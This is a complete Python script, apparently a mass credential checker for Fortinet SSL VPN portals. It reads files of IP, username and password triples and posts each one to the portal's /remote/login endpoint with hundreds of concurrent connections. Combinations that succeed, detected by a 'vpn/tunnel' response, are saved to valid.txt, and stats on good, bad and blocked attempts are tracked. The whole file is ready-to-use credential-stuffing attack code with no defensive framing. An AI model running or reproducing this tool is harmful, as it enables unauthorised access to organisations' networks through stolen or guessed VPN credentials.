#!/usr/bin/env python3
from __future__ import annotations

import os
import asyncio
import aiohttp
import aiofiles
import re
import json
import time
import signal
import argparse
from pathlib import Path

parser = argparse.ArgumentParser(description="Fortinet VPN checker")
parser.add_argument(
    "--check-dir",
    default=os.environ.get("CHECK_DIR", "/root/NAM/Check"),
    help="Directory with part_*.txt files",
)
parser.add_argument(
    "--servis-dir",
    default=os.environ.get("SERVIS_DIR", "/root/NAM/Servis"),
    help="Directory for config and stats files",
)
args = parser.parse_args()

# === рабочий каталог с part_*.txt ===
os.chdir(args.check_dir)

# === Конфиг ===
CONF_PATH = Path(args.servis_dir) / 'config.txt'
def load_conf():
    cfg = {'threads': '500', 'timeout': '10'}
    if CONF_PATH.exists():
        for line in CONF_PATH.read_text().splitlines():
            m = re.match(r'\s*([^#=]+)=\s*(\S+)', line)
            if m:
                cfg[m.group(1).strip()] = m.group(2).strip()
    return int(cfg['threads']), int(cfg['timeout'])

THREADS, TIMEOUT = load_conf()
SEM = asyncio.Semaphore(THREADS)
HTTP_TIMEOUT = aiohttp.ClientTimeout(total=TIMEOUT)

# === статистика ===
STATS_PATH = Path(args.servis_dir) / f'stats_{os.getpid()}.json'
stats = {
    'goods':0,'bads':0,'errors':0,'offline':0,'ipblock':0,
    'processed':0,'pair_index':0,'pair_total':1,'pair_start':time.time()
}

async def dump_stats():
    while True:
        tmp = STATS_PATH.with_suffix('.tmp')
        tmp.write_text(json.dumps(stats), encoding='utf-8')
        tmp.replace(STATS_PATH)
        await asyncio.sleep(2)

async def worker(combo:str, session:aiohttp.ClientSession):
    ip, login, pwd = combo.split(';')
    data={'username':login,'password':pwd}
    stats['processed'] += 1
    try:
        async with SEM:
            async with session.post(f'https://{ip}/remote/login', data=data) as resp:
                txt = await resp.text()
                if resp.status==200 and 'vpn/tunnel' in txt:
                    stats['goods'] += 1
                    async with aiofiles.open('valid.txt','a') as vf:
                        await vf.write(combo+'\n')
                else:
                    stats['bads'] += 1
    except asyncio.TimeoutError:
        stats['offline'] += 1
    except aiohttp.ClientConnectionError:
        stats['offline'] += 1
    except Exception:
        stats['errors'] += 1

async def main():
    files=list(Path('.').glob('part_*.txt'))
    if not files:
        print('[ERR] Нет входных файлов'); return
    stats['pair_total']=len(files)
    asyncio.create_task(dump_stats())
    async with aiohttp.ClientSession(timeout=HTTP_TIMEOUT) as session:
        tasks=[]
        for idx,f in enumerate(files,1):
            stats['pair_index']=idx
            async with aiofiles.open(f,'r') as fd:
                async for line in fd:
                    line=line.strip()
                    if not line: continue
                    tasks.append(asyncio.create_task(worker(line,session)))
        await asyncio.gather(*tasks)

if __name__=='__main__':
    try:
        asyncio.run(main())
    finally:
        # финальный дамп
        STATS_PATH.write_text(json.dumps(stats), encoding='utf-8')